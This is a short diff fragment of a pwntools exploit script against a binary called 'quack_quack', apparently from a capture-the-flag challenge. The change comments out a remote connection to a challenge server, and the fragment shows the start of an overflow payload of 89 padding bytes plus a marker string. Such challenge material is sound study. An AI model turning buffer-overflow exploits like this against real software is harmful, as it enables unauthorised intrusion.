@@ -3,7 +3,7 @@ from pwn import *
 context.binary = elf = ELF('quack_quack')
 
 pr = process()
-pr = remote('83.136.253.71',33618)
+# pr = remote('83.136.253.71',33618)
 # gdb.attach(pr)
 payload = b'A'*89
 payload += b'Quack Quack '
